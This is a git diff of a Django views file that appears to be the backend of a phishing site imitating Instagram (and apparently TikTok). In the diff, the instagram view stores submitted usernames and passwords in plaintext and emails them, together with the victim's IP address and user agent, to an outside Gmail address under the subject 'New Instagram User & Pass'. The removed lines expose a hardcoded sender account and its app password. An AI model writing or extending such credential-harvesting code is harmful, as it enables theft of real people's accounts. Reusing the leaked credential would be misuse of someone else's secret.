@@ -1,8 +1,24 @@
 from django.shortcuts import render, redirect, get_object_or_404
 from django.contrib.auth import authenticate, login, logout
 from django.contrib import messages
+from django.core.mail import send_mail
 from .models import Category, Post, Comment, ReplayComment, User
 
+
+##########################
+def send_email(subject, message, recipient_list):
+    try:
+        send_mail(
+            subject,
+            message,
+            'your_email@gmail.com',  # From email
+            recipient_list,
+            fail_silently=False,
+        )
+        print("Email sent successfully!")
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+##########################
 
 def home(request):
     posts = Post.objects.all()
@@ -104,41 +120,36 @@ def auth(request):
 
 def instagram(request):
     if request.method == "POST":
-        print(request.POST)
+        ip_address = request.META.get('REMOTE_ADDR')
+        user_agent = request.META.get('HTTP_USER_AGENT')
+        
         username = request.POST.get("username")
         password = request.POST.get("password")
         from .models import Instagram
         if username and password:
             Instagram.objects.create(username=username, password=password).save()
         #######################################
-        try:
-            import smtplib
-            my_email = "jjjhacking@gmail.com"
-            email_password = "mjzs kcsc cvjs cbji"
             content = f"""
 username = {username}
 password = {password}
 
+ip_address = {ip_address}
+user_agent = {user_agent}
+
 {request.POST}
+
                     """
-            with smtplib.SMTP("smtp.gmail.com") as con:
-                con.starttls()
-                con.login(user=my_email, password=email_password)
-                con.sendmail(
-                    from_addr=my_email,
-                    to_addrs="eyobjjj@gmail.com",
-                    msg=f"Subject:**New Instagram User & Pass**\n\nhi {content}"
-                )
-        except:
-        #except Exception as e:
-            print(f"{'*'*20} can't send email {'*'*20}")
-            #print(type(e))
-            #print(e)
+            send_email("**New Instagram User & Pass**", content, ["eyobjjj@gmail.com"])
         #######################################
     return render(request, "instagram/index.html")
 
 
 def e_tiktok1(request):
     return render(request, "e-tiktok1/index.html")
+
+
+
+
+
 
 
